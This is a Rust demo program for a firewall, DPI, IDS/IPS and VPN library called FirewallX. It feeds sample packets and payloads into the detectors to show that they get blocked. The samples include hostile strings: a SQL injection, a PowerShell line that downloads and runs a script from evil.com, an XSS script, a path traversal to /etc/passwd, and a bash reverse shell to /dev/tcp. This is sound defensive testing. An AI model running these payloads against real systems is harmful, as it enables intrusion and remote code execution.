// firewallx/src/main.rs
// FirewallX v0.2.0 — DPI + IDS/IPS + VPN demo

use std::net::Ipv4Addr;

use firewallx::{
    FirewallEngine, Packet, Protocol, Direction,
    Rule, Action, RuleSet,
    DpiEngine,
    IdsEngine, IdsConfig,
    VpnGateway, PeerConfig, CipherSuite, AuthMethod,
};
use firewallx::modules::engine::EngineConfig;
use std::time::Duration;

fn separator(title: &str) {
    println!("\n{}", "═".repeat(60));
    println!("  {}", title);
    println!("{}", "═".repeat(60));
}

fn main() {
    env_logger::init();

    separator("1 · FirewallEngine (stateful + rules + DPI + IDS)");

    let mut rs = RuleSet::new();
    rs.add(Rule::new(1,  "Allow SSH",    Action::Allow, None, None, Some(22),  Protocol::Tcp, Direction::Inbound));
    rs.add(Rule::new(2,  "Allow HTTPS",  Action::Allow, None, None, Some(443), Protocol::Tcp, Direction::Outbound));
    rs.add(Rule::new(3,  "Allow HTTP",   Action::Allow, None, None, Some(80),  Protocol::Tcp, Direction::Inbound));
    rs.add(Rule::new(999,"Default deny", Action::Drop,  None, None, None,      Protocol::Any, Direction::Inbound));

    let ids_cfg = IdsConfig {
        ips_mode: true,
        port_scan_threshold: 6,
        flood_pps_threshold: 20,
        brute_force_threshold: 3,
        window: Duration::from_secs(30),
        max_payload_bytes: 65_000,
        block_duration: Duration::from_secs(120),
    };
    let mut engine = FirewallEngine::with_config(rs, EngineConfig::default(), ids_cfg);

    let http_pkt = Packet::new(
        Ipv4Addr::new(203,0,113,1), Ipv4Addr::new(10,0,0,1),
        54321, 80, Protocol::Tcp, Direction::Inbound, 128,
    );

    let d = engine.process_with_payload(&http_pkt, b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n");
    println!("[HTTP  clean ] {:?}", d);

    let d = engine.process_with_payload(&http_pkt, b"GET /login?user=' OR '1'='1&pass=x HTTP/1.1\r\n");
    println!("[HTTP  SQLi  ] {:?}  <- DPI blocked", d);

    let d = engine.process_with_payload(&http_pkt, b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')");
    println!("[HTTP  PS    ] {:?}  <- DPI blocked", d);

    let ssh_pkt = Packet::new(Ipv4Addr::new(203,0,113,5), Ipv4Addr::new(10,0,0,1), 60000, 22, Protocol::Tcp, Direction::Inbound, 64);
    let d = engine.process_with_payload(&ssh_pkt, b"SSH-2.0-OpenSSH_8.9p1");
    println!("[SSH   clean ] {:?}", d);

    let rdp_pkt = Packet::new(Ipv4Addr::new(8,8,8,8), Ipv4Addr::new(10,0,0,1), 1234, 3389, Protocol::Tcp, Direction::Inbound, 0);
    let d = engine.process(&rdp_pkt);
    println!("[RDP   inbnd ] {:?}  <- default deny", d);

    let s = engine.stats();
    println!("\nStats → total:{} allowed:{} dropped:{} dpi_blocked:{} ips_blocked:{}",
        s.total, s.allowed, s.dropped, s.dpi_blocked, s.ips_blocked);

    separator("2 · DPI Engine — payload inspection");

    let mut dpi = DpiEngine::new();
    let samples: &[(&str, &[u8])] = &[
        ("ELF binary",     b"\x7fELF\x02\x01\x01\x00"),
        ("XSS attempt",    b"<script>alert('xss')</script>"),
        ("Path traversal", b"GET /../../../etc/passwd HTTP/1.1"),
        ("Bash rev shell", b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
        ("TLS handshake",  b"\x16\x03\x01\x00\xf4\x01\x00\x00\xf0\x03\x03"),
        ("Clean HTTP",     b"GET /about HTTP/1.1\r\nHost: example.com\r\n"),
    ];
    println!("{:<18} {:<12} {:<10} {}", "Sample", "Protocol", "Blocked", "Sig IDs");
    println!("{}", "-".repeat(60));
    for (label, payload) in samples {
        let r = dpi.inspect(payload);
        let sigs: Vec<_> = r.matches.iter().map(|m| m.sig_id.to_string()).collect();
        println!("{:<18} {:<12} {:<10} {}", label, r.app_protocol.to_string(), r.blocked, sigs.join(", "));
    }

    separator("3 · IDS/IPS — behavioural detection");

    let mut ids = IdsEngine::new(IdsConfig {
        ips_mode: true,
        port_scan_threshold: 5,
        flood_pps_threshold: 8,
        brute_force_threshold: 3,
        window: Duration::from_secs(60),
        max_payload_bytes: 10_000,
        block_duration: Duration::from_secs(60),
    });
    let attacker = Ipv4Addr::new(6,6,6,6);
    println!("Port scan from {}...", attacker);
    for port in [22u16, 80, 443, 3306, 5432, 8080] {
        let pkt = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 9000, port, Protocol::Tcp, Direction::Inbound, 0);
        for a in ids.inspect(&pkt) {
            println!("  ALERT [{:?}] {}", a.kind, a.description);
        }
    }
    println!("Total alerts: {}", ids.total_alerts());

    separator("4 · VPN Gateway — tunnel lifecycle");

    let mut vpn = VpnGateway::new();
    let remote = Ipv4Addr::new(203, 0, 113, 100);
    vpn.add_peer(
        PeerConfig::new(remote, CipherSuite::Aes256Gcm, AuthMethod::PreSharedKey)
            .with_psk("super_secret_key")
            .with_network("10.20.0.0/16".parse().unwrap())
    );
    let tid = vpn.initiate(remote).unwrap();
    vpn.complete_handshake(tid, Some("super_secret_key")).unwrap();
    println!("Tunnel #{} established with {}", tid, remote);
    vpn.route_outbound(Ipv4Addr::new(10,20,1,5), 1024).unwrap();
    vpn.route_inbound(remote, 2048).unwrap();
    let s = vpn.session(tid).unwrap();
    println!("Traffic: out={}B in={}B  key={}...", s.bytes_out, s.bytes_in, &s.session_key[..16]);
    vpn.rekey(tid).unwrap();
    println!("Rekeyed tunnel #{}", tid);

    // Bad PSK demo
    let remote2 = Ipv4Addr::new(203, 0, 113, 200);
    vpn.add_peer(PeerConfig::new(remote2, CipherSuite::ChaCha20Poly1305, AuthMethod::PreSharedKey).with_psk("correct"));
    let tid2 = vpn.initiate(remote2).unwrap();
    match vpn.complete_handshake(tid2, Some("wrong")) {
        Err(e) => println!("Auth rejected for {}: {} ✓", remote2, e),
        Ok(_)  => println!("Unexpected success"),
    }
    println!("Active tunnels: {}", vpn.active_tunnel_count());

    separator("FirewallX v0.2.0 — all systems operational");
}
